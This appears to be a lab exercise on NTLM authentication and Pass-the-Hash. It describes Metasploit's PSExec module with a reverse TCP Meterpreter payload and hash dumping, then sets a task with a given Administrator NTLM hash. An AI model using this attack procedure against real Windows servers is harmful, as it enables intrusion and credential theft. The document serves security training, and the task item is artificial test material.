For a user to authenticate, the system must prove that it has access to the NTLM in the SAM file.

NTLM uses a challenge-response authentication method. This means the client will receive a challenge from the server when they attempt to connect.
The challenge will usually take the form of data, like a random number.
The client will encrypt that data using a secret key based on a password and send it back to the server.

Metasploit has a PSExec exploit module that allows users to run a Pass-the-Hash attack on a Windows server with a Reverse TCP Meterpreter payload.
To successfully run this module you will need to provide it with the SMBUser, SMBPass, Remote Host IP, Local Host IP and the Meterpreter payload.
The PSExec Pass-the-Hash guide from Offsec states that if ‘NTLM is only available (for example, it’s a 15+ character password or through GPO they specify NTLM response only), simply replace the ****NOPASSWORD**** with 32 0’s'.

There are many options available to the user on the target server, including executing commands to run on the target or dumping hashes using Mter hashdump, a Meterpreter 'post' module.


You will have to execute a Pass-the-Hash attack to gain access to the admin account and read the file located in the C:\token directory.
You will need to set the SMBPass, SMBUser and payload using the credentials provided below.

Payload: windows/x64/meterpreter/reverse_tcp

Username: Administrator

NTLM Hash: 00000000000000000000000000000000:A7BD002336399D61B4099A19771E4EF8
